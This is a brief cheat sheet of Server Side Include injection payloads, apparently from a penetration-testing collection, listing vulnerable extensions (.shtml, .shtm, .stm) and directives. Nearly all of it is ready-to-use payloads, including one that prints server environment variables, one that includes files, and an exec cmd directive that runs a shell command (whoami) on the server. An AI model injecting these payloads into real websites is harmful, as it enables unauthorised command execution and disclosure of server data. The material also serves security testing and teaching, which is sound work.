SERVER SIDE INCLUDE
Potential vulnerable site extensions are: .shtml, .shtm, .stm

Directive Syntax:
```
<!--#name param1="value1" param2="value" -->
```



#### Payloads

Print env variable (no parameters).
```
<!--#printenv -->
```

Change the error message in the SSI configurations.
```
<!--#config errmsg="Error!" -->
```

echo variables of calle parameters, supported parameters: DOCUMENT_NAME, DOCUMENT_URI, LAST_MODIFIED, DATE_LOCAL.
```
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

Execute command
```
<!--#exec cmd="whoami" -->
```

Include file specified in virtual parameter. Can only do files in root directory
```
<!--#include virtual="index.html" -->
```